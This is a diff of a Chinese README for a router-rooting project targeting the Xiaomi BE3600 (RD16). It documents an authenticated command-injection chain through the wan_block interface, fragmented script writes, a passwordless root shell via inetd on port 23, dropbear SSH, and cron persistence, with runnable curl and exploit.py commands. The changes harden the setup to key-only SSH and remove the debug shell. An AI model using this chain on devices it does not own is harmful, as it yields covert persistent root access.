@@ -27,16 +27,18 @@ scene_start ──► 注入命令以 root 执行（≤18 字符/条）
 碎片写入（echo -n F>/tmp/N + cat /tmp/?>x + sh x）
     │   绕过 18 字符与禁用字符限制，写任意脚本文本
     ▼
-inetd.conf + /usr/sbin/inetd ──► :23 / :2323 免密 root /bin/sh
+inetd.conf + /usr/sbin/inetd ──► :23 临时免密 root /bin/sh（调试用）
     │
     ▼
 /data + /etc/crontabs（sec_cfg）──► 看门狗每分钟自愈
-dropbear + authorized_keys ────► :22 SSH（密钥/密码均可用）
+dropbear -s + authorized_keys ────► :22 SSH（仅密钥）
+persist 验证 :22 可达后 ──► 移除 inetd 与临时 shell
 ```
 
 - **认证后 RCE**：需要 Web 管理密码换 `stok` token 才能到达注入接口，不是未授权 RCE
 - XMiR-Patcher 的历史注入点（`start_binding` 等）在 1.0.41 已全部修复；这条 `wan_block` 通道是目前唯一实测可用的注入面
 - `/etc` 是 ramfs（重启全清），持久化只能落在 `/data`（UBIFS）与 `/etc/crontabs`（sec_cfg ext4）上
+- `:23` 免密 shell 只做调试通道；`persist` 阶段在确认 SSH 可用后会关闭 inetd，看门狗只负责恢复 dropbear
 
 ## 实测约束
 
@@ -54,18 +56,19 @@ dropbear + authorized_keys ────► :22 SSH（密钥/密码均可用）
 macOS / Linux（需 `python3` + `curl`）：
 
 ```bash
-curl -fsSLo /tmp/rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py && python3 /tmp/rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist
+curl -fsSLo /tmp/rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py && python3 /tmp/rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist --pubkey 'ssh-rsa AAAA...你的公钥'
 ```
 
 Windows PowerShell（`python` 不存在就把命令里的 `python` 换成 `py`）：
 
 ```powershell
-irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist
+irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist --pubkey 'ssh-rsa AAAA...你的公钥'
 ```
 
-- `--stage persist` = 全自动：注入 → inetd（:23/:2323 root shell）→ dropbear（:22 SSH）→ `/data` + cron 看门狗，重启自动恢复
-- 追加 `--pubkey 'ssh-rsa AAAA...'` 可同时写入 SSH 公钥，之后 `ssh root@192.168.31.1`
-- 只要一次性 shell：把 `--stage persist` 换成 `--stage shell`，完成后 `nc 192.168.31.1 23`
+- `--stage persist` = 全自动：注入 → 临时 inetd（:23）→ 写入密钥 + dropbear（:22，`-s` 仅密钥）→ 验证 SSH 可达后移除 inetd → `/data` + cron 看门狗自愈
+- `--pubkey` **必填**：SSH 只做密钥认证，密码登录整路关闭（不再有 `-B` 空密码）
+- 追加 `--allow-cidr 192.168.31.0/24` 可让 persist 顺手加 iptables，把 :22 限到该网段
+- 只要临时调试 shell：`--stage persist` 换成 `--stage shell`，完成后 `nc 192.168.31.1 23`（重启即消失，不写持久配置）
 
 ## 快速复现（exploit.py）
 
@@ -73,11 +76,11 @@ irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi
 git clone https://github.com/ChiphaLo/xiaomi-be3600-rd16-ssh.git && cd xiaomi-be3600-rd16-ssh
 
 python3 exploit.py --ip 192.168.31.1 --password '你的管理密码' --stage shell
-# 之后: nc <路由器IP> 23  →  root /bin/sh
+# 之后: nc <路由器IP> 23  →  root /bin/sh（临时调试用）
 
 python3 exploit.py --ip 192.168.31.1 --password '你的管理密码' --stage persist \
     --pubkey 'ssh-rsa AAAA...你的公钥'
-# SSH（:22）+ shell（:23/:2323）自动恢复，重启不掉
+# SSH（:22，仅密钥）重启不掉；:23 临时 shell 验证后自动移除
 ```
 
 exploit.py 只用标准库，完成登录→注入→inetd→(可选)持久化全过程。
@@ -94,6 +97,8 @@ cat /tmp/?>/tmp/x      # 按 glob 序拼回完整脚本
 sh /tmp/x
 ```
 
+文件名用 `0-9a-z`（36 个名额）；超出后 exploit.py 自动把每批拼进双字符累加文件（`/tmp/x0`、`/tmp/x1`…），最后统一组装——手工操作时可 `cat /tmp/?>/tmp/xx` 移到双字符名再继续。
+
 ## 完整实现方式
 
 下面是不依赖工具的完整手工路径（与 exploit.py 等价），每一步都可单独验证。
@@ -107,12 +112,14 @@ sh /tmp/x
 
 ```bash
 TOK=$(curl -s -X POST 'http://192.168.31.1/cgi-bin/luci/api/xqsystem/login' \
-    --data 'username=admin&password=你的密码&logtype=2' \
+    --data-urlencode 'username=admin' \
+    --data-urlencode 'password=你的密码' \
+    --data-urlencode 'logtype=2' \
     | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
 echo "$TOK"
 ```
 
-> 注意登录 body 必须用 `--data` 原样发，不要 `--data-urlencode`（会把 `&` 编码进参数名）。
+> 密码要逐字段 `--data-urlencode`（`&`、`+` 等字符必须编码）；不要把整串 body 塞进一个 `--data-urlencode`，那会把 `&` 编码进参数名。
 
 ### 2. 命令执行通道：scene + wan_block
 
@@ -164,7 +171,7 @@ sh /tmp/x                             # 执行
 
 文件名用 `0-9a-z`（36 个名额），超出就 `cat /tmp/?>/tmp/xx` 移到双字符名再继续。
 
-### 5. 拿 shell：inetd
+### 5. 拿临时 shell：inetd（调试用）
 
 裸 `telnetd` 会因 `nvram get telnet_en`/`bdata get telnet_en` 检查秒退；`set_telnet` 又被 `apps.telnet` 特性开关挡住。改用 inetd（不检查该项）：
 
@@ -174,9 +181,9 @@ cp /tmp/ii /etc/inetd.conf
 inetd
 ```
 
-`/tmp/ii` = `23 stream tcp nowait root /bin/sh sh`（inetd 自 daemonize，不卡调用方）。之后 `nc <ip> 23` → 免密 root shell。多绑几个端口就写多行 conf。
+`/tmp/ii` = `23 stream tcp nowait root /bin/sh sh`（inetd 自 daemonize，不卡调用方）。之后 `nc <ip> 23` → 免密 root shell。**它只当调试通道——重启即消失，也不要写进持久化；第 7 步确认 SSH 可用后要关掉它。**
 
-### 6. SSH（可选，更稳妥）
+### 6. SSH：仅密钥的 dropbear
 
 ```sh
 # /etc/dropbear/dropbear_rsa_host_key 是 0 字节占位文件，必须先删
@@ -184,12 +191,12 @@ rm /etc/dropbear/dropbear_rsa_host_key
 dropbearkey -t rsa -f /data/dropbear_rsa_host_key     # ~1min，生成到 /data（持久）
 mkdir -p /etc/dropbear
 echo '你的 ssh-rsa 公钥' > /etc/dropbear/authorized_keys
-/usr/sbin/dropbear -r /data/dropbear_rsa_host_key -B  # -B 允许空密码
+/usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key  # -s 禁用密码登录，仅密钥
 ```
 
-`ssh -i 私钥 root@<ip>` 即通。此固件 musl 不支持 `$6$` sha512 密码哈希，密码认证用 `$1$` md5。
+`ssh -i 私钥 root@<ip>` 即通。**不要加 `-B`**（允许空密码登录是事故源）；如果确实要密码登录，root 密码哈希得用 `$1$` md5（此固件 musl 不支持 `$6$` sha512）。
 
-### 7. 持久化
+### 7. 持久化（看门狗只管 dropbear）
 
 `/etc` 是 ramfs，重启回 squashfs 初始态——但 `/data`（UBIFS）与 `/etc/crontabs`（sec_cfg ext4）持久。写 `/data/persist.sh`：
 
@@ -197,10 +204,8 @@ echo '你的 ssh-rsa 公钥' > /etc/dropbear/authorized_keys
 #!/bin/sh
 mkdir -p /etc/dropbear
 cp /data/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null
-cp /data/inetd.conf /etc/inetd.conf 2>/dev/null
-pgrep -x inetd    >/dev/null 2>&1 || /usr/sbin/inetd
 pgrep -x dropbear >/dev/null 2>&1 || \
-    /usr/sbin/dropbear -r /data/dropbear_rsa_host_key -B
+    /usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key
 ```
 
 `/etc/crontabs/root` 加一行（该文件在 sec_cfg 上，重启不掉）：
@@ -209,7 +214,22 @@ pgrep -x dropbear >/dev/null 2>&1 || \
 * * * * * sh /data/persist.sh >/dev/null 2>&1
 ```
 
-重启后 ~1 分钟 inetd + dropbear 自动恢复。
+收尾两步：
+
+```sh
+# 确认 :22 已监听（netstat -lnt），然后关掉调试 shell
+for p in $(pgrep -x inetd); do kill $p; done
+rm -f /etc/inetd.conf
+```
+
+可选：把 SSH 限到管理网段（写进 persist.sh 一起自愈）：
+
+```sh
+iptables -I INPUT -p tcp -s 192.168.31.0/24 --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp --dport 22 -j DROP
+```
+
+重启后 ~1 分钟 dropbear 自动恢复，而 inetd 不会回来。
 
 ## 涉及文件
 
